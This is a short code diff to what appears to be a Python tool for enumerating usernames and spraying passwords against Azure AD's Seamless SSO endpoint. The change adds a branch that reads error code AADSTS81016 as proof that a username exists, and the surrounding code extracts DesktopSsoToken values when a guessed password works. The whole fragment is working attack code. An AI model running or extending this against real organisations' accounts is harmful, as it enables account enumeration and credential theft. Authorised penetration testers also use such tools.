@@ -174,6 +174,12 @@ def checkURL(userline):
         with open(outputfile,"a") as outfilestream:
             outfilestream.write("[+] FOUND VALID USERNAME:{}\n".format(credentialset))
         writeLock.release()
+    elif "AADSTS81016" in xmlresponse:
+        print("[+] VALID USERNAME, invalid password :{}".format(credentialset))
+        writeLock.acquire()
+        with open(outputfile,"a") as outfilestream:
+            outfilestream.write("[+] FOUND VALID USERNAME:{}\n".format(credentialset))
+        writeLock.release()
     elif "DesktopSsoToken" in xmlresponse:
         print("[+] VALID CREDS! :{}".format(credentialset))
         result = re.findall(r"<DesktopSsoToken>.{1,}</DesktopSsoToken>", xmlresponse)
